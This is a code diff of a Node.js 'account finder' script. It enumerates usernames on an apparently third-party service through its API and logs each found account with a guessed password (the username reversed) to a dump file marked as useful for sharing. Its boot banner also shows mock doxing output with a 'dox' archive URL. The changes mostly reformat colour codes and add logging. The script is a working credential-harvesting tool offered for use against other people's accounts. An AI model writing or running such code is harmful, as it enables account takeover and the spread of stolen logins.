@@ -33,27 +33,34 @@ const doxLast = [
 ]
 var current = 1
 
-console.log("   \x1b[36m[BOOT]:\x1b[0m INITIALIZING ACCOUNT FINDER [CODENAME 7HU6_HUN73R]; STANDBY...")
-console.log("   \x1b[36m[BOOT]:\x1b[0m DOX SYSTEMS: ONLINE")
-console.log("   \x1b[36m[BOOT]:\x1b[0m LATEST DOX: " + doxFirst[Math.floor(Math.random() * doxFirst.length)] + " " + doxLast[Math.floor(Math.random() * doxLast.length)] + " @ http://dox.gtoria.net/all/archive.7z")
+console.log("   [36m[BOOT]:[0m INITIALIZING ACCOUNT FINDER [CODENAME 7HU6_HUN73R]; STANDBY...")
+console.log("   [36m[BOOT]:[0m DOX SYSTEMS: ONLINE")
+console.log("   [36m[BOOT]:[0m LATEST DOX: " + doxFirst[Math.floor(Math.random() * doxFirst.length)] + " " + doxLast[Math.floor(Math.random() * doxLast.length)] + " @ http://dox.gtoria.net/all/archive.7z")
 entry()
 
 var requestedUser = ""
 var txtData = ""
 async function entry() {
     txtData = "temp"
-    if(!fs.existsSync('./accdmp/')){
+    logData = "[93m[LOG]\n"
+    if (!fs.existsSync('./accdmp/')) {
         fs.mkdirSync('./accdmp/')
-        console.log("   \x1b[93m[APP]:\x1b[0m CREATED: 'accdmp' Folder.")
-        if(!fs.existsSync('./accdmp/dump-temp.txt')){
-            fs.writeFileSync('./accdmp/dump-temp.txt', txtData)
-            console.log("   \x1b[93m[APP]:\x1b[0m CREATED: 'dump-temp' Text Document.")
+        console.log("   [93m[APP]:[0m CREATED: 'accdmp' Folder.")
+        if (!fs.existsSync('./accdmp/dump-temp.ansi')) {
+            fs.writeFileSync('./accdmp/dump-temp.ansi', txtData)
+            console.log("   [93m[APP]:[0m CREATED: 'dump-temp' ANSI File (useful for sharing).")
+        }
+        if (!fs.existsSync('./accdmp/app-log.log')) {
+            fs.writeFileSync('./accdmp/app-log.log', logData)
+            console.log("   [93m[APP]:[0m CREATED: 'app-log' Log File.")
         }
     }
-    requestedUser = await readline.questionAsync(`   \x1b[93m[APP]:\x1b[0m Enter username to begin search (Recommended to use common bot names) \x1b[90m`)
+    requestedUser = await readline.questionAsync(`   [93m[APP]:[0m Enter username to begin search (Recommended to use common bot names) [90m`)
     process.on('SIGINT', async function () {
-        console.log("   \x1b[93m[APP]:\x1b[0m SEARCH STOPPED: User ended process.")
-        console.log("   \x1b[93m[APP]:\x1b[0m NOTE: Save dump as a different file as it will get overwritten if you run the app again.")
+        console.log("   [93m[APP]:[0m SEARCH STOPPED: User ended process.")
+        console.log("   [93m[APP]:[0m NOTE: Save dump as a different file as it will get overwritten if you run the app again.")
+        logData = logData + '[93m[APP]:[0m SEARCH STOPPED: User ended process.\n'
+        fs.writeFileSync('./accdmp/app-log.log', logData)
         process.exit()
     });
     main()
@@ -76,18 +83,20 @@ async function main() {
         .then(async function (data) {
             if (data.body.data[0] != undefined) {
                 if (data.body.data[0].name === requestedUser + current) {
-                    console.log("   \x1b[92m[ACCOUNT]:\x1b[0m USERNAME: " + data.body.data[0].name + " // PASSWORD: " + data.body.data[0].name.split("").reverse().join(""))
-                    txtData = txtData + '[ACCOUNT]: USERNAME: '+data.body.data[0].name+' // PASSWORD: '+data.body.data[0].name.split("").reverse().join("")+'\n'
-                    fs.writeFileSync('./accdmp/dump-temp.txt', txtData.trimStart())
-                }else{
-                    console.log("   \x1b[93m[APP]:\x1b[0m Ignored " + data.body.data[0].name + "; Name didn't match casing.")
+                    console.log("   [92m[ACCOUNT]:[0m USERNAME: " + data.body.data[0].name + " // PASSWORD: " + data.body.data[0].name.split("").reverse().join(""))
+                    txtData = txtData + '[32m[ACCOUNT]:[0m USERNAME: ' + data.body.data[0].name + ' // PASSWORD: ' + data.body.data[0].name.split("").reverse().join("") + '\n'
+                    fs.writeFileSync('./accdmp/dump-temp.ansi', txtData.trimStart())
+                } else {
+                    console.log("   [93m[APP]:[0m Ignored " + data.body.data[0].name + "; Name didn't match casing.")
                 }
             }
             current++
             return main()
         })
         .catch(async function (error) {
-            console.log("   \x1b[93m[APP]:\x1b[91m SEARCH STOPPED: Unknown Error.")
+            console.log("   [93m[APP]:[91m SEARCH STOPPED: Unknown Error.")
+            logData = logData + '[93m[LOG]:[91m ' + error + '\n'
+            fs.writeFileSync('./accdmp/app-log.log', logData)
             return entry()
         });
 }
